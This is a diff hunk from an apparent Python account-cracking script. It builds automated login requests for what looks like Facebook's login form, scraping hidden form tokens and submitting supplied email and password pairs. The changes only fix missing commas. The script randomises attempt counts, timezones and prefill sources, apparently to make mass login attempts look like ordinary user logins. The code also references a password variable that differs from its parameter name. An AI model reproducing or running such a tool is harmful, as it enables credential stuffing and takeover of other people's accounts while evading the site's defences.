@@ -201,13 +201,13 @@ def _M1_(ids,pasx):
                         'return_session':re.search('name="return_session" value="(.*?)"', str(BLACKX)).group(1),
                         'skip_api_login': random.choice(['', '1']),
                         'signed_next': re.search('name="signed_next" value="(.*?)"', str(BLACKX)).group(1),
-                        'trynum': str(random.randint(1, 10))
-                        'timezone':str(random.randint(-720, 720))
+                        'trynum': str(random.randint(1, 10)),
+                        'timezone':str(random.randint(-720, 720)),
                         'lgndim':re.search('name="lgndim" value="(.*?)"', str(BLACKX)).group(1),
                         'lgnrnd':re.search('name="lgnrnd" value="(.*?)"', str(BLACKX)).group(1),
                         'lgnjs':re.search('name="lgnjs" value="(.*?)"', str(BLACKX)).group(1),
                         'email': ids,
-                        'pass' : ps
+                        'pass' : ps,
                         'prefill_contact_point': ids,
                         'prefill_source': random.choice(['browser_dropdown', 'browser_saved', 'messenger_code']),
                         'prefill_type': random.choice(['password', 'contact_point']),
